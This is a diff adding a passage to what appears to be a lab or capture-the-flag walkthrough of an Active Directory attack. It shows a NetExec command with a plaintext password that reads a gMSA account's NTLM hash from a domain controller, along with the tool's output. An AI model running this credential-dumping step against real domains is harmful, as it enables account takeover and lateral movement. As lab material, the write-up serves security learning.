@@ -338,3 +338,15 @@ I will now collect bloodhound data using sharphound and a c2 session i just got 
 
 After collecting bloodhound data i see i have ReadGMSAPassword on the user `ca_svc_account$`
 
+```python
+nxc ldap dc.ext.darkhaven.local -u 'kwarren' -p '!@#darkhav3n123#@!' --gmsa               
+LDAP        10.10.10.136    389    DC               [*] Windows 11 / Server 2025 Build 26100 (name:DC) (domain:ext.darkhaven.local) (signing:Enforced) (channel binding:No TLS cert) 
+LDAP        10.10.10.136    389    DC               [+] ext.darkhaven.local\kwarren:!@#darkhav3n123#@! 
+LDAP        10.10.10.136    389    DC               [*] Getting GMSA Passwords
+LDAP        10.10.10.136    389    DC               Account: ca_svc_account$      NTLM: 3ab7add8db852831e7299c61ba35e2d2     PrincipalsAllowedToReadPassword: GRP-gMSA-ca_svc_account-Readers
+```
+I now have the NTLM hash of the `ca_svc_account$`
+
+```python
+
+```
